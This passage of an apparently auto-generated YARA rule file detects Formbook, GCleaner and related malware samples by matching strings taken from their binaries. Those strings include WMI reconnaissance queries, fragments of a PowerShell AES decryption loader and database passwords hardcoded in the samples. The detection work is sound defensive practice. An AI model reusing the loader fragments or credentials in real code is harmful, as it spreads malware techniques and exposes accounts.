      $s2 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '30.00'*/
      $s3 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '30.00'*/
      $s4 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '29.00'*/
      $s5 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '27.00'*/
      $s7 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s8 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 48));" fullword ascii /* score: '27.00'*/
      $s9 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s10 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s11 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_DriverForDevice\", null, 48));" fullword ascii /* score: '25.00'*/
      $s12 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", null, 48));" fullword ascii /* score: '25.00'*/
      $s13 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_DisplayControllerConfiguration\", null, 48));" ascii /* score: '25.00'*/
      $s14 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_PrinterConfiguration\", null, 48));" fullword ascii /* score: '25.00'*/
      $s15 = "                    var e = new Enumerator(service.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48));" fullword ascii /* score: '25.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 700KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _e37c113b29d3f8fe493d80a79f5e60fb2b9a7ee070b3fff6994534f40a13f1fe_e37c113b_Formbook_signature__7bb1496e_10 {
   meta:
      description = "_subset_batch - from files e37c113b29d3f8fe493d80a79f5e60fb2b9a7ee070b3fff6994534f40a13f1fe_e37c113b.js, Formbook(signature)_7bb1496e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e37c113b29d3f8fe493d80a79f5e60fb2b9a7ee070b3fff6994534f40a13f1fe"
      hash2 = "7bb1496e66ce154f68fcb8df8f4e282b64d9783f1058ec05433415052d10ad76"
   strings:
      $s1 = "iframe.src=\"javascript:\";" fullword ascii /* score: '25.00'*/
      $s2 = "var compliantExecNpcg=/()??/.exec(\"\")[1]===void 0;" fullword ascii /* score: '23.00'*/
      $s3 = "// ES6: https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/String" fullword ascii /* score: '21.00'*/
      $s4 = "descriptor.get=getter;" fullword ascii /* score: '21.00'*/
      $s5 = "if(!compliantExecNpcg){" fullword ascii /* score: '19.00'*/
      $s6 = "if(!compliantExecNpcg&&match.length>1){" fullword ascii /* score: '19.00'*/
      $s7 = "Object.getOwnPropertyDescriptor=function(object,property){" fullword ascii /* score: '18.00'*/
      $s8 = "defineGetter(object,property,descriptor.get);" fullword ascii /* score: '18.00'*/
      $s9 = "var boundLength=Math.max(0,target.length-args.length);" fullword ascii /* score: '17.00'*/
      $s10 = "Empty.prototype=target.prototype;" fullword ascii /* score: '17.00'*/
      $s11 = "// https://github.com/douglascrockford/JSON-js/blob/master/json2.js" fullword ascii /* score: '17.00'*/
      $s12 = "throw new TypeError(ERR_NON_OBJECT_TARGET+object);" fullword ascii /* score: '17.00'*/
      $s13 = "var match=isoDateExpression.exec(string);" fullword ascii /* score: '16.00'*/
      $s14 = "while(match=separator.exec(string)){" fullword ascii /* score: '16.00'*/
      $s15 = "throw new TypeError(\"Function.prototype.bind called on incompatible \"+target);" fullword ascii /* score: '16.00'*/
   condition:
      ( uint16(0) == 0x0a0d and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _GCleaner_signature__28ac7cd2ef7aff01e48b5edb1b01be41_imphash__GCleaner_signature__28ac7cd2ef7aff01e48b5edb1b01be41_imphash__11 {
   meta:
      description = "_subset_batch - from files GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash).exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_2203c96e.exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_74273805.exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_a639d8ed.exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_b13f24b0.exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_e0c21356.exe, GCleaner(signature)_28ac7cd2ef7aff01e48b5edb1b01be41(imphash)_e470c966.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e7f7a21ee9aaf1f982d222aa7637f8f32c88c44e0b24d9a470fe5ccc47ee55fe"
      hash2 = "2203c96ef56407f1c2b8ec820b89beb20ca0d31bc0ba7a4fc21fb99ab67e18ee"
      hash3 = "74273805a7bd7441f36bdc596eff7b4597c254015727024c2e86717d8954bbe3"
      hash4 = "a639d8ed17108b7cf50aa15e689f62c03a04b409a6204249d0f9503b55d888bd"
      hash5 = "b13f24b087cdcd13ceb92ba139fdc48d03fd5f2c394984c4fd4aa2286ca1e81b"
      hash6 = "e0c21356fdd99942e1d9e89f0afee73e5f14772bf5f8836ab8b96a997ba76768"
      hash7 = "e470c9662b570ea239ed7b599322559bc86d2f150dfc5e2503d083b40da3cd89"
   strings:
      $s1 = "dbExpress Error: Invalid Time(dbExpress Error: Operation Not Supported)dbExpress Error: Invalid Data Translation\"dbExpress Erro" wide /* score: '15.00'*/
      $s2 = "\"dbExpress Error: Parameter Not Set\"dbExpress Error: Result set at EOF*dbExpress Error: Invalid Username/Password\"dbExpress E" wide /* score: '13.00'*/
      $s3 = "TCommonDialogX" fullword ascii /* score: '12.00'*/
      $s4 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s5 = "EComponentErrortwA" fullword ascii /* score: '10.00'*/
      $s6 = "3 3+383=3" fullword ascii /* score: '9.00'*/ /* hex encoded string '383' */
      $s7 = ";!;.;3;;;E;" fullword ascii /* score: '9.00'*/ /* hex encoded string '>' */
      $s8 = "OnGetSiteInfo`rA" fullword ascii /* score: '9.00'*/
      $s9 = "%sDThis authentication method is already registered with class name %s." fullword wide /* score: '9.00'*/
      $s10 = "TConversion4" fullword ascii /* score: '8.00'*/
      $s11 = "OnKeyDown0" fullword ascii /* score: '8.00'*/
      $s12 = "Invalid SQL date/time values2dbExpress Error: Insufficient Memory for Operation#dbExpress Error: Invalid Field TypedbExpress Er" wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 11000KB and pe.imphash() == "28ac7cd2ef7aff01e48b5edb1b01be41" and ( 8 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__430c8581_f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f5d1b297_12 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_430c8581.exe, f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f5d1b297.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "430c858102b9799dd3d0d6c553b1c495dbe45d1787c514a902c7ac70f1b8efd1"
      hash2 = "f5d1b297fde1e74ca827da6fbd4e95fc593331ce84927140e67aefb46d3f50ef"
   strings:
      $s1 = "ZSystem.UInt16, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '27.00'*/
      $s2 = "BluetoothAPIs.dll" fullword ascii /* score: '23.00'*/
      $s3 = "libusb-1.0.dll" fullword ascii /* score: '20.00'*/
      $s4 = "GetConfigDescriptor" fullword ascii /* score: '18.00'*/
      $s5 = "libusb_get_config_descriptor" fullword ascii /* score: '18.00'*/
      $s6 = "libusb_get_config_descriptor_by_value" fullword ascii /* score: '18.00'*/
      $s7 = "GetConfigDescriptorByValue" fullword ascii /* score: '18.00'*/
      $s8 = "GetActiveConfigDescriptor" fullword ascii /* score: '18.00'*/
      $s9 = "libusb_get_active_config_descriptor" fullword ascii /* score: '18.00'*/
      $s10 = "get_KernelVersion" fullword ascii /* score: '17.00'*/
      $s11 = "GetDeviceDescriptor" fullword ascii /* score: '15.00'*/
      $s12 = "GetDeviceKeyValueFailed" fullword ascii /* score: '15.00'*/
      $s13 = "libusb_get_device_descriptor" fullword ascii /* score: '15.00'*/
      $s14 = "UnlockEvents" fullword ascii /* base64 encoded string 'RyhrA/z{l' */ /* score: '14.00'*/
      $s15 = "UsbInterfaceDescriptor" fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__520b3406_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_13 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_520b3406.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9b949289.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "520b34067b58114e7c3d40563f6bfea19c2f42cfdeb1d1804f9fd97cf4279ba6"
      hash2 = "9b94928911642675a9e2a0cd6d93ee82b60b126d746a943b505d40ebd87bce8d"
   strings:
      $s1 = "EventTracker_{0:yyyyMMdd}.log" fullword wide /* score: '19.00'*/
      $s2 = "C:\\EventTracker\\Logs" fullword wide /* score: '18.00'*/
      $s3 = "Event Tracker Export - {0:yyyy-MM-dd HH:mm:ss}" fullword wide /* score: '18.00'*/
      $s4 = "systemLogger" fullword ascii /* score: '17.00'*/
      $s5 = "SystemLogger" fullword wide /* score: '17.00'*/
      $s6 = "Failed to initialize logger: " fullword wide /* score: '17.00'*/
      $s7 = "SystemLogger shutting down" fullword wide /* score: '17.00'*/
      $s8 = "EventTracker_*.log" fullword wide /* score: '16.00'*/
      $s9 = "GetEventDescription" fullword ascii /* score: '15.00'*/
      $s10 = "System Event Tracker - Main" fullword wide /* score: '15.00'*/
      $s11 = "Time Range: {0:MM/dd/yyyy HH:mm} - {1:MM/dd/yyyy HH:mm}" fullword wide /* score: '15.00'*/
      $s12 = "GetLogFileSize" fullword ascii /* score: '14.00'*/
      $s13 = "<GetWindowsEventLogEvents>b__4_0" fullword ascii /* score: '14.00'*/
      $s14 = "GetWindowsEventLogEvents" fullword ascii /* score: '14.00'*/
      $s15 = "get_EnableLogging" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__e5736df8_Fuery_signature__f34d5f2d4577ed6d9ceec516c1f5a744_im_14 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e5736df8.exe, Fuery(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_9c0d7aef.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e5736df87221b67a2e2a614374e1d6353043b95e08448ea9260e103ab18a5c8d"
      hash2 = "9c0d7aefababf691ddb1e9a932679470c95223cee339fdf2d65ec28964dd38a2"
   strings:
      $s1 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADf" fullword ascii /* score: '27.00'*/
      $s2 = "ErrorReporter_{0:yyyyMMdd}.log" fullword wide /* score: '25.00'*/
      $s3 = "Process Information - " fullword wide /* score: '23.00'*/
      $s4 = "Process hang detected - no stack trace available" fullword wide /* score: '23.00'*/
      $s5 = "GetMonitoredProcesses" fullword ascii /* score: '20.00'*/
      $s6 = "<GetMonitoredProcesses>b__19_0" fullword ascii /* score: '20.00'*/
      $s7 = "https://crashreports.example.com/api/submit" fullword wide /* score: '20.00'*/
      $s8 = "CrashMonitor_{0:yyyyMMdd}.log" fullword wide /* score: '19.00'*/
      $s9 = "SELECT * FROM Win32_Process WHERE ProcessId = {0}" fullword wide /* score: '19.00'*/
      $s10 = "CrashMonitor.ProcessListForm.resources" fullword ascii /* score: '18.00'*/
      $s11 = "Error loading processes: " fullword wide /* score: '18.00'*/
      $s12 = "Error terminating process: " fullword wide /* score: '18.00'*/
      $s13 = "Error retrieving process information: " fullword wide /* score: '18.00'*/
      $s14 = "Error refreshing process list: " fullword wide /* score: '18.00'*/
      $s15 = "Error handling process termination for " fullword wide /* score: '18.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _e62bf5ac5919f9383ff2df530f9df6f3_imphash__ebdf1faad3fe3995e6a8d879acd0fe91ef1456aa702651af9d2c029ad8c66ad8_ebdf1faa_15 {
   meta:
      description = "_subset_batch - from files e62bf5ac5919f9383ff2df530f9df6f3(imphash).exe, ebdf1faad3fe3995e6a8d879acd0fe91ef1456aa702651af9d2c029ad8c66ad8_ebdf1faa.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "8a7e9d7e3dd09eebf658c668104a93570b22d86f41cda8fd4d64fba09b78ac4f"
      hash2 = "ebdf1faad3fe3995e6a8d879acd0fe91ef1456aa702651af9d2c029ad8c66ad8"
   strings:
      $s1 = "NTLM handshake failure (bad type-2 message). Target Info Offset Len is set incorrect by the peer" fullword ascii /* score: '20.00'*/
      $s2 = "Content-Type: %s%s%s" fullword ascii /* score: '16.00'*/
      $s3 = "Content-Disposition: %s%s%s%s%s%s%s" fullword ascii /* score: '16.00'*/
      $s4 = "SOCKS4%s: connecting to HTTP proxy %s port %d" fullword ascii /* score: '15.50'*/
      $s5 = "getaddrinfo() thread failed to start" fullword ascii /* score: '15.00'*/
      $s6 = "No valid port number in connect to host string (%s)" fullword ascii /* score: '15.00'*/
      $s7 = "Connection closure while negotiating auth (HTTP 1.0?)" fullword ascii /* score: '13.00'*/
      $s8 = "oversized cookie dropped, name/val %zu + %zu bytes" fullword ascii /* score: '13.00'*/
      $s9 = "Unsupported proxy '%s', libcurl is built without the HTTPS-proxy support." fullword ascii /* score: '13.00'*/
      $s10 = "Unsupported proxy scheme for '%s'" fullword ascii /* score: '13.00'*/
      $s11 = "SOCKS5: connecting to HTTP proxy %s port %d" fullword ascii /* score: '13.00'*/
      $s12 = "username=\"%s\", realm=\"%s\", nonce=\"%s\", uri=\"%s\", cnonce=\"%s\", nc=%08x, qop=%s, response=\"%s\"" fullword ascii /* score: '12.50'*/
      $s13 = "operation aborted by trailing headers callback" fullword ascii /* score: '12.00'*/
      $s14 = "Operation timed out after %I64d milliseconds with %I64d bytes received" fullword ascii /* score: '12.00'*/
      $s15 = "Unrecognized content encoding type. libcurl understands %s content encodings." fullword ascii /* score: '12.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x4b50 ) and filesize < 17000KB and pe.imphash() == "e62bf5ac5919f9383ff2df530f9df6f3" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1d4ff817_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_16 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1d4ff817.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_81b5aa53.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1d4ff817c5fd2fe6cb4a0a9415d9485d572025bb2d82123cb0dd3b6eb3e8ea14"
      hash2 = "81b5aa53fb0d1d9e99a1444276172d115c6c9de90954ab02f6e29beeeda51a37"
   strings:
      $s1 = "ystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, S" ascii /* score: '27.00'*/
      $s3 = "comando" fullword ascii /* score: '11.00'*/
      $s4 = "server=localhost;port=3307;uid=root;pwd=etecjau" fullword wide /* score: '11.00'*/
      $s5 = "E:\\materias\\DES_SIST\\WindowsForm\\ProjetoVendas\\211377\\fotos_clientes\\" fullword wide /* score: '10.00'*/
      $s6 = "abrirConexao" fullword ascii /* score: '9.00'*/
      $s7 = "get_estoque" fullword ascii /* score: '9.00'*/
      $s8 = "get_valor_venda" fullword ascii /* score: '9.00'*/
      $s9 = "get_data_nasc" fullword ascii /* score: '9.00'*/
      $s10 = "conexao" fullword ascii /* score: '8.00'*/
      $s11 = "consultar" fullword ascii /* score: '8.00'*/
      $s12 = "pesquisa" fullword ascii /* score: '8.00'*/
      $s13 = "adaptador" fullword ascii /* score: '8.00'*/
      $s14 = "estoque" fullword wide /* score: '8.00'*/
      $s15 = "SELECT * FROM cidades WHERE nome like @nome order by id" fullword wide /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _e72240a051b3e7eda44b65b961211a67_imphash__e72240a051b3e7eda44b65b961211a67_imphash__336e6c68_17 {
   meta:
      description = "_subset_batch - from files e72240a051b3e7eda44b65b961211a67(imphash).exe, e72240a051b3e7eda44b65b961211a67(imphash)_336e6c68.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1e14cd78be0e1708963e601d2f4ca19fc94b46c034314489508d22b54786e926"
      hash2 = "336e6c683d014775b1e9fc5e9953f5ae01d240969adc652705a7ddb1ba744a81"
   strings:
      $x1 = "    cmdParams3 = \"$AES=New-Object System.Security.Cryptography.AesManaged;$AES.Mode=[System.Security.Cryptography.CipherMode]::" ascii /* score: '36.00'*/
      $x2 = "C:\\vmagent_new\\bin\\joblist\\33555\\out\\Release\\360ShellPro.pdb" fullword ascii /* score: '35.00'*/
      $x3 = "es=[Convert]::FromBase64String((Get-Content -Path '\" & targetFilePath64 & \"' -Raw -Encoding UTF8));$DecryptedBytes=$Decryptor." ascii /* score: '34.00'*/
      $s4 = "        Set colProcessList = objWMIService.ExecQuery(\"Select * from Win32_Process Where name = 'toolsps.exe'\")" fullword ascii /* score: '30.00'*/
      $s5 = "alt,1000);$AES.Key=$DerivedBytes.GetBytes(32);$AES.IV=$DerivedBytes.GetBytes(16);$Decryptor=$AES.CreateDecryptor();$EncryptedByt" ascii /* score: '27.00'*/
      $s6 = "360ShellPro.exe" fullword wide /* score: '27.00'*/
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                           ' */ /* score: '26.50'*/
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                        ' */ /* score: '26.50'*/
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */ /* score: '26.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */ /* score: '26.50'*/
      $s11 = "R0ZxKzVoUEJyeGllaG8vOThycXB6Y1ovRm1KREJ3ZGYrMnIwcW1QN3FOV0RuSm9pMzJ4dllYcmZkakxLNUM0dmlCckZxZHRnckIvTElVVHE0U2Q2My9kTU9qNm1wY3Fq" ascii /* base64 encoded string 'GFq+5hPBrxieho/98rqpzcZ/FmJDBwdf+2r0qmP7qNWDnJoi32xvYXrfdjLK5C4viBrFqdtgrB/LIUTq4Sd63/dMOj6mpcqj' */ /* score: '26.00'*/
      $s12 = "http://down.360safe.com/setup.exe" fullword wide /* score: '25.00'*/
      $s13 = "360Config.exe" fullword wide /* score: '25.00'*/
      $s14 = "http://down.360safe.com/setupbeta.exe" fullword wide /* score: '25.00'*/
      $s15 = "ansformFinalBlock($EncryptedBytes,0,$EncryptedBytes.Length);$DecryptedContent=[System.Text.Encoding]::UTF8.GetString($DecryptedB" ascii /* score: '24.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "e72240a051b3e7eda44b65b961211a67" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _f34d5f2d4577ed6d9ceec516c1f5a744_imphash__86571ebb_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__45a93d40_F_18 {
   meta:
      description = "_subset_batch - from files f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_86571ebb.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_45a93d40.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fce3addf.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "86571ebb401134463c831b36fb0536c5a233a7273993393c604061630fe2dc78"
      hash2 = "45a93d40cacc929a74d68e107aa98540161d575be7907241fc9c287ffdf96791"
      hash3 = "fce3addf7bc763d7ab8119c76fcf745efbe557cf88b3de94b577a32f69bd304e"
   strings:
      $s1 = "\\SERVER=localhost; Database=used_cars; UID=root; Password=dumbdaddy;allow user variables=true" fullword ascii /* score: '20.00'*/
      $s2 = "Login Failed !" fullword wide /* score: '18.00'*/
      $s3 = "select * from users where u_pass=md5('" fullword wide /* score: '16.00'*/
      $s4 = "Used_cars.Presentation.Login.resources" fullword ascii /* score: '15.00'*/
      $s5 = "Login_Shown" fullword ascii /* score: '15.00'*/
      $s6 = "Login_Load" fullword ascii /* score: '15.00'*/
      $s7 = "Password change Failed" fullword wide /* score: '15.00'*/
      $s8 = "Login Information" fullword wide /* score: '15.00'*/
      $s9 = "Login Failed... " fullword wide /* score: '13.00'*/
      $s10 = "changePasswordToolStripMenuItem_Click" fullword ascii /* score: '12.00'*/
      $s11 = "changePasswordToolStripMenuItem" fullword wide /* score: '12.00'*/
      $s12 = "Change_Password" fullword wide /* score: '12.00'*/
      $s13 = "btn_login" fullword wide /* score: '12.00'*/
      $s14 = "Change_Password_Load" fullword ascii /* score: '12.00'*/
      $s15 = "Password changed" fullword wide /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__29688877_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_19 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_29688877.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3c1a1ea6.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c14649f.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a85b7578.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_b92ba639.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_bb8b6590.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c2f65520.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f09f4b94.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "29688877a36107747d055f72f6760d360a6f3715ef32d90f46815838b56e18dc"
      hash2 = "3c1a1ea671c0c3123d70cb864680bebfa1c151ed303514c2bd77347cec44dd9a"
      hash3 = "5c14649f341b72c153a02cc99d0852f7b0ded81f67a6513af7d188dfdce5a53e"
      hash4 = "a85b7578e700e44701c5d209f2508af54766db163063d2a41f14012249ca7991"
      hash5 = "b92ba639eab5cffac0ba3cd2e1ea98448be3063b2dd43a6e102e284734f9cb4f"
      hash6 = "bb8b6590ca5c65bf55bb227ac601636414ec7c1fa1f9a603840f57e45f8f8994"
      hash7 = "c2f65520679a99af012fb9ba6d2eab1beb9af9de7d5acc28aa34c80f1b49c736"
      hash8 = "f09f4b940847bf5c83277322ac6c73c2a6f50efc3ac0c0d606928bc917a35c52"
   strings:
      $s1 = "Event Log Analysis Report - " fullword wide /* score: '20.00'*/
      $s2 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.txt" fullword wide /* score: '19.00'*/
      $s3 = "Error getting statistics for event log '" fullword wide /* score: '17.00'*/
      $s4 = "Error getting available event logs: " fullword wide /* score: '17.00'*/
      $s5 = "Error getting entry count for event log '" fullword wide /* score: '17.00'*/
      $s6 = "Event Log Analyzer - v1.0" fullword wide /* score: '17.00'*/
      $s7 = "labelLogInfo" fullword wide /* score: '15.00'*/
      $s8 = "UpdateLogInfo" fullword ascii /* score: '15.00'*/
      $s9 = "EventLogAnalyzer.Forms.ErrorPatternForm.resources" fullword ascii /* score: '15.00'*/
      $s10 = "Error reading event log '" fullword wide /* score: '15.00'*/
      $s11 = "EventLog_Analysis_{0}_{1:yyyyMMdd_HHmmss}.csv" fullword wide /* score: '15.00'*/
      $s12 = "<GetEventLogStatistics>b__5_1" fullword ascii /* score: '14.00'*/
      $s13 = "<GetAvailableEventLogs>b__6_0" fullword ascii /* score: '14.00'*/
      $s14 = "<GetEventLogStatistics>b__5_2" fullword ascii /* score: '14.00'*/
      $s15 = "GetAvailableEventLogs" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and pe.imphash() == "f34d5f2d4577ed6d9ceec516c1f5a744" and ( 8 of them )
      ) or ( all of them )
}

rule _Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__1da6708a_Formbook_signature__f34d5f2d4577ed6d9ceec516c1f5a744_20 {
   meta:
      description = "_subset_batch - from files Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_1da6708a.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_33ac0576.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_86807dc0.exe, Formbook(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_e1f4bf96.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1da6708a65f8dfe0c3359c8aa3fd07387c7aed37af8c66e5a5a0893aab14f547"
      hash2 = "33ac05762eba2ee4e7e72b22ff93fb26ba715d416ee5cc0fe4e7009b4cc37fb7"
      hash3 = "86807dc07a40390df6246332b833f324853306e4273db9601ab71a2f21902003"
      hash4 = "e1f4bf968e975bdb45e48107ef68200d53e96ee2598b44e1f424ab7e298b4e52"
   strings:
      $s1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s2 = "stem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ahSystem.Drawing.Bitmap, System.Drawing, Version=4" ascii /* score: '27.00'*/
      $s3 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3agSystem.Drawing.Point, Sy" ascii /* score: '27.00'*/
      $s4 = "Select * From Table_Secretarys Where SecretaryTC=@p1 and SecretaryPassword=@p2" fullword wide /* score: '19.00'*/
      $s5 = "The deletion process failed" fullword wide /* score: '18.00'*/
      $s6 = "Select * from Table_Patients where PatientTC=@p1 and PatientPassWord=@p2" fullword wide /* score: '16.00'*/
      $s7 = "The deletion process is successful" fullword wide /* score: '15.00'*/
      $s8 = "get_HospitalDataBaseConnectionString" fullword ascii /* score: '12.00'*/
      $s9 = "Select DoctorTC,DoctorPassword From Table_Doctors Where DoctorTC=@p1 and DoctorPassword=@p2" fullword wide /* score: '12.00'*/
      $s10 = "You entered the wrong TC or PASSWORD !!" fullword wide /* score: '12.00'*/
      $s11 = "PASSWORD:" fullword wide /* score: '12.00'*/
      $s12 = "Update Table_Doctors Set DoctorFirstName=@p1,DoctorSurName=@p2,DoctorBranch=@p3,DoctorTC=@p4,DoctorPassword=@p5 Where DoctorTC=@" wide /* score: '12.00'*/
      $s13 = "Select DoctorFirstName,DoctorSurName,DoctorBranch,DoctorPassword From Table_Doctors Where DoctorTC=@p1" fullword wide /* score: '12.00'*/
